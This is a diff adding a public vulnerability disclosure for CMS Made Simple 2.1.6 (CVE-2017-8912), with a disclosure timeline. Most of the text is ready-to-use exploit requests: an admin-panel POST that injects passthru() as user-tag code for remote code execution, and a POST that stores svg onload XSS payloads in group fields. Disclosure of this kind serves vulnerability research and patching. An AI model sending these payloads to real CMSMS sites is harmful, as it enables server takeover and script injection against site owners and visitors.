@@ -1,0 +1,30 @@
+# Title:             CMSMS 2.1.6 Multiple Vulnerabilities
+# Date:              10-05-2017
+# Tested on:         Windows 8 64-bit
+# Exploit Author:    Osanda Malith Jayathissa (@OsandaMalith)
+# Original write-up: https://osandamalith.com/2017/05/11/cmsms-2-1-6-multiple-vulnerabilities/
+# CVE: CVE-2017-8912
+
+Remote Code Execution
+======================
+
+POST /cmsms/admin/editusertag.php?_sk_=2a7da2216d41e0ac&userplugin_id=4 HTTP/1.1
+
+_sk_=2a7da2216d41e0ac&userplugin_id=4&userplugin_name=aaa&code=passthru('dir')%3B&description=&run=1&apply=1&ajax=1 
+
+
+Stored XSS 
+==========
+
+POST /cmsms/admin/addgroup.php HTTP/1.1
+
+_sk_=92a32a8aaa87e958&group=%3Csvg%2Fonload%3Dalert%282%29%3E&description=%22%3E%3Csvg%2Fonload%3Dalert%283%29%3E&active=on&addgroup=true
+
+
+Disclosure Timeline
+====================
+
+09-05-2017: Reported to the vendor
+09-05-2017: Vendor doesn't accept XSS issues inside admin panel and claimed the RCE as a feature, not a bug :)
+10-05-2017: Public disclosure
+11-05-2017: Assigned CVE-2017-8912
